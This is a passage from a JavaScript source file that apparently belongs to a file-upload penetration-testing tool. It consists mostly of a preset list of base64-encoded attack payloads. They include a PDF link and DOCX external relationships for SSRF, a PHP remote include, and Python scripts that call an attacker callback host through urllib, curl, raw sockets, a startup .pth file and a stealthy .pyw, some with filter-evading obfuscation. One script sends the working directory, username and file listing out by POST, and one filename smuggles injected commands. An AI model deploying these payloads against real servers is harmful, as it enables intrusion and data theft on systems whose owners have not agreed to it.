            _enc: 'JVBERi0xLjAKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9QYWdlcyAyIDAgUj4+ZW5kb2JqCjIgMCBvYmo8PC9UeXBlL1BhZ2VzL0tpZHNbMyAwIFJdL0NvdW50IDE+PmVuZG9iagozIDAgb2JqPDwvVHlwZS9QYWdlL1BhcmVudCAyIDAgUi9NZWRpYUJveFswIDAgNjEyIDc5Ml0vQW5ub3RzWzQgMCBSXT4+ZW5kb2JqCjQgMCBvYmo8PC9UeXBlL0Fubm90L1N1YnR5cGUvTGluay9SZWN0WzAgMCA2MTIgNzkyXS9BPDwvUy9VUkkvVVJJKGh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3BkZi1jbGljayk+Pj4+ZW5kb2JqCnRyYWlsZXI8PC9Sb290IDEgMCBSPj4=',
        },
        {
            id: 'oob-ssrf-docx',
            category: 'Out-of-Band',
            name: 'DOCX with external relationships (SSRF)',
            description: 'Real .docx ZIP file with 4 external relationship types in word/_rels/document.xml.rels: attachedTemplate, frame, hyperlink, oleObject. Each hits a different /upload/docx-* token. Triggers SSRF when server processes/opens the document.',
            filename: 'report.docx',
            content_type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            is_binary: true,
            content_b64: 'UEsDBBQAAAAIAHsDUFzXeYTq8QAAALgBAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbH2QzU7DMBCE730Ky9cqccoBIZSkB36OwKE8wMreJFb9J69b2rdn00KREOVozXwz62nXB+/EHjPZGDq5qhspMOhobBg7+b55ru6koALBgIsBO3lEkut+0W6OCUkwHKiTUynpXinSE3qgOiYMrAwxeyj8zKNKoLcworKt9ML+Kqq+SmsmThyabaMkGqa6VzOL1jh/0lSfK1qB4g1xewLNRfcRslIl65xmu/0/649o4DFbjhZ/TUo4aiXh77+qL4sGG71+06jR8/wlQSwMEFAAAAAgAewNQXCAbhuqyAAAALgEAAAsAAABfcmVscy8ucmVsc43Puw6CMBQG4J2naM4uBQdjDIXFmLAafICmPZRGeklbL7y9HRzEODie23fyN93TzOSOIWpnGdRlBQStcFJbxeAynDZ7IDFxK/nsLDJYMELXFs0ZZ57yTZy0jyQjNjKYUvIHSqOY0PBYOo82T0YXDE+5DIp6Lq5cId1W1Y6GTwPagpAVS3rJIPSyBjIsHv/h3ThqgUcnbgZt+vHlayPLPChMDB4uSCrf7TKzQHNKuorZvgBQSwMEFAAAAAgAewNQXKSqbx4/AQAAlwMAABEAAAB3b3JkL2RvY3VtZW50LnhtbJ2TS27DIBCG9z2FxT7B6aKqrNhZNOoJ0gMQjGNUw6CB2M3tO/hRNSqq3Hox5qH/m38Y2B8+TJf1Cr0GW7LdNmeZshJqbS8lezu9bp5Z5oOwtejAqpLdlGeH6mE/FDXIq1E2ZESwvhicLFkbgis497JVRvit0RLBQxO2EgyHptFS8QGw5o/5Lh9HDkEq7yndi7C98Owh+/ZNaPOTDE5Z2mwAjQg0xQs3At+vbkOZnAj6rDsdbpQnf0ohoWRXtMWM23wZjfJiMjr/Umpc42eSH+dTGp1wVB15A+tb7dKl/pdMm20K2P9WaG+6lGZwa1zUKAZqm+kmA/fNPE6bSfouX3H4EZdUr7F272VxaIS2SWS813+4uXOxdHYV0eglnKG+VSOYJq6igDGE6qR8yJY+7XlcihHH6EY1X+RxtDyp6hNQSwMEFAAAAAgAewNQXGdleAEPAQAAjQMAABwAAAB3b3JkL19yZWxzL2RvY3VtZW50LnhtbC5yZWxzrZPbSgMxEIbv+xQh9222VURkd0utCsWKIOsDjMnswWaTkExlS+m7G/BYsODCXk6G7/+/uUg671rN3tCHxpqMTycJZ2ikVY2pMv5c3I0vOQsERoG2BjO+w8Dn+Sh9Qg0UmVA3LrAYYkLGayJ3JUSQNbYQJtahiZvS+hYojr4SDuQGKhSzJLkQ/ncGz0eMHcWylcq4X6kpZ8XO4X/ibVk2Em+s3LZo6I8WAUQQeVVg6+I78tjKWAG+Qvpu2O+Xi/X6erG8PxzE1mkLSigruzF9UZ/Eg1XR67Yj9AY0FydvmA15Q+mh7Sn+gfS1PhvSuo5JXjdm08/8B+trfz6kvdX4+PKKkvrZR+y0dyqOflH+DlBLAQIUABQAAAAIAHsDUFzXeYTq8QAAALgBAAATAAAAAAAAAAAAAACAAQAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAhQAFAAAAAgAewNQXCAbhuqyAAAALgEAAAsAAAAAAAAAAAAAAIABIgEAAF9yZWxzLy5yZWxzUEsBAhQAFAAAAAgAewNQXKSqbx4/AQAAlwMAABEAAAAAAAAAAAAAAIAB/QEAAHdvcmQvZG9jdW1lbnQueG1sUEsBAhQAFAAAAAgAewNQXGdleAEPAQAAjQMAABwAAAAAAAAAAAAAAIABawMAAHdvcmQvX3JlbHMvZG9jdW1lbnQueG1sLnJlbHNQSwUGAAAAAAQABAADAQAAtAQAAAAA',
        },
        {
            id: 'oob-rfi-php',
            category: 'Out-of-Band',
            name: 'PHP include OOB',
            description: 'PHP file that includes a remote URL — confirms RFI and triggers OOB callback.',
            filename: 'rfi.php',
            content_type: 'application/x-httpd-php',
            _enc: 'PD9waHAgaW5jbHVkZSgiaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvcmZpLXBocCIpOyA/Pg==',
        },

        // -- Python Execution -------------------------------------------------

        {
            id: 'py-exec',
            category: 'Python Execution',
            name: 'Basic urllib OOB ping (.py)',
            description: 'Simple Python script using urllib to ping your OOB server. Tests if .py files can be uploaded and executed.',
            filename: 'script.py',
            content_type: 'text/x-python',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==',
        },
        {
            id: 'py-exec-txt',
            category: 'Python Execution',
            name: 'Double extension (.py.txt)',
            description: 'Python OOB ping with .py.txt double extension — tests if server strips the last extension and executes .py.',
            filename: 'notes.py.txt',
            content_type: 'text/plain',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==',
        },
        {
            id: 'py-exec-jpg',
            category: 'Python Execution',
            name: 'Image disguise (.py.jpg)',
            description: 'Python OOB ping with .py.jpg extension and image/jpeg MIME — tests if server only checks final extension or MIME.',
            filename: 'photo.py.jpg',
            content_type: 'image/jpeg',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==',
        },
        {
            id: 'py-shebang',
            category: 'Python Execution',
            name: 'With shebang line (.py)',
            description: 'Python script with #!/usr/bin/env python3 shebang — executable on Unix if server sets +x or runs via shell.',
            filename: 'run.py',
            content_type: 'text/x-python',
            _enc: 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgdXJsbGliLnJlcXVlc3QKdXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvcHktc2hlYmFuZyIp',
        },
        {
            id: 'py-import',
            category: 'Python Execution',
            name: 'Obfuscated __import__ (.py)',
            description: 'Single-line Python using __import__ — bypasses naive content filters looking for "import urllib".',
            filename: 'utils.py',
            content_type: 'text/x-python',
            _enc: 'X19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWltcG9ydCIp',
        },
        {
            id: 'py-os',
            category: 'Python Execution',
            name: 'os.system + curl (.py)',
            description: 'Uses os.system to shell out to curl — works even if urllib is blocked but curl is available on the server.',
            filename: 'task.py',
            content_type: 'text/x-python',
            _enc: 'aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9weS1vcyIp',
        },
        {
            id: 'py-socket',
            category: 'Python Execution',
            name: 'Raw socket (no http libs) (.py)',
            description: 'Uses raw socket — works even if urllib/requests are stripped. Minimal dependency.',
            filename: 'helper.py',
            content_type: 'text/x-python',
            _enc: 'aW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoKQpob3N0PSJ7e0NBTExCQUNLfX0iLnNwbGl0KCIvLyIpWy0xXS5zcGxpdCgiLyIpWzBdLnNwbGl0KCI6IilbMF0KdHJ5OgogIHMuY29ubmVjdCgoaG9zdCw4MCkpCiAgcy5zZW5kKGIiR0VUIC91cGxvYWQvcHktc29ja2V0IEhUVFAvMS4wDQpIb3N0OiAiK2hvc3QuZW5jb2RlKCkrYiINCg0KIikKICBzLmNsb3NlKCkKZXhjZXB0OiBwYXNz',
        },
        {
            id: 'py-wsgi',
            category: 'Python Execution',
            name: 'WSGI application (.wsgi)',
            description: 'Python WSGI app format — if the server auto-deploys .wsgi files (mod_wsgi, uWSGI), this executes on first request.',
            filename: 'app.wsgi',
            content_type: 'application/octet-stream',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmRlZiBhcHBsaWNhdGlvbihlbnZpcm9uLCBzdGFydF9yZXNwb25zZSk6CiAgdXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvcHktd3NnaSIpCiAgc3RhcnRfcmVzcG9uc2UoIjIwMCBPSyIsIFsoIkNvbnRlbnQtVHlwZSIsInRleHQvcGxhaW4iKV0pCiAgcmV0dXJuIFtiIm9rIl0=',
        },
        {
            id: 'py-pth',
            category: 'Python Execution',
            name: '.pth auto-execute (site-packages)',
            description: '.pth files placed in site-packages are auto-executed by Python on startup. If upload path overlaps with a Python environment, this runs silently.',
            filename: 'debug.pth',
            content_type: 'text/plain',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9weS1wdGgiKQ==',
        },
        {
            id: 'py-pyw',
            category: 'Python Execution',
            name: 'Windowless Python (.pyw)',
            description: '.pyw runs via pythonw.exe on Windows without a console window — stealthier execution path.',
            filename: 'service.pyw',
            content_type: 'application/octet-stream',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==',
        },
        {
            id: 'py-exfil',
            category: 'Python Execution',
            name: 'Env exfiltration via POST (.py)',
            description: 'Exfiltrates cwd, username, and directory listing to your OOB server via POST body. Check /api/live for the JSON payload.',
            filename: 'report.py',
            content_type: 'text/x-python',
            _enc: 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0LG9zLGpzb24KZGF0YT1qc29uLmR1bXBzKHsiY3dkIjpvcy5nZXRjd2QoKSwidXNlciI6b3MuZ2V0ZW52KCJVU0VSIixvcy5nZXRlbnYoIlVTRVJOQU1FIiwiPyIpKSwiZmlsZXMiOm9zLmxpc3RkaXIoIi4iKX0pCnVybGxpYi5yZXF1ZXN0LnVybG9wZW4odXJsbGliLnJlcXVlc3QuUmVxdWVzdCgiaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvcHktZXhmaWwiLGRhdGE9ZGF0YS5lbmNvZGUoKSxoZWFkZXJzPXsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9KSk=',
        },

        // -- Edge Cases -------------------------------------------------------

        {
            id: 'edge-empty-filename',
            category: 'Edge Cases',
            name: 'Empty filename',
            description: 'Empty filename string — tests server behaviour with missing filenames.',
            filename: '',
            content_type: 'application/octet-stream',
            _enc: 'dGVzdA==',
        },
        {
            id: 'edge-long-filename',
            category: 'Edge Cases',
            name: 'Oversized filename (500 chars)',
            description: 'Very long filename to test buffer handling and path length limits.',
            filename: 'A'.repeat(496) + '.php',
            content_type: 'application/octet-stream',
            _enc: 'PD9waHAgZWNobyAiUkNFX09LIjsgPz4=',
        },
        {
            id: 'edge-special-chars',
            category: 'Edge Cases',
            name: 'Special chars in filename',
            description: 'Filename with semicolons, pipes, backticks — tests command injection via filename.',
            filename: 'file;id|`whoami`.php',
            content_type: 'application/octet-stream',
            _enc: 'dGVzdA==',
        },
        {
            id: 'edge-zero-byte',
            category: 'Edge Cases',
            name: 'Zero-byte file',
            description: 'Empty file body — tests how the server handles zero-length uploads.',
            filename: 'empty.php',
            content_type: 'application/x-httpd-php',
            content: '',
        },
    ];

    // Keep _enc raw — decode lazily when accessed so OOB URL is always current
    return presets.map(p => {
        if (p._enc) {
            const raw = p._enc;
            Object.defineProperty(p, 'content', {
                get() { return _d(raw); },
                enumerable: true,
                configurable: true,
            });
            delete p._enc;
        }
        return p;
    });
})();
